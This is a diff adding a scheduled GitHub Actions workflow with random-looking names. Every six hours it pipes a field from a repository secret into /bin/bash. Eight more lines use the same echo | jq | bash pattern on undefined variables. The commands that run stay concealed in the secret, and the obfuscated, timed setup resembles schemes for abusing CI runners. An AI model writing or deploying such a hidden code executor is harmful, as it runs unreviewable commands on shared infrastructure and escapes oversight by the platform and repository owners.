@@ -1,0 +1,25 @@
+name: jiancaishunqing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiancaishunqing
+        env:
+          gg9835: ${{ secrets.gg9835 }}
+        run: |
+          echo $gg9835 | jq -r .nusq9094 | /bin/bash
+          echo $fedc1 | jq -r .uloxe271 | /bin/bash
+          echo $erq6 | jq -r .univr21388 | /bin/bash
+          echo $m7548 | jq -r .m086 | /bin/bash
+          echo $cwcvy426 | jq -r .rf68676 | /bin/bash
+          echo $n60916 | jq -r .mmyl58 | /bin/bash
+          echo $vtvjc00912 | jq -r .z4 | /bin/bash
+          echo $lrxu7 | jq -r .n69435 | /bin/bash
+          echo $qa3461 | jq -r .mwdd610 | /bin/bash
+
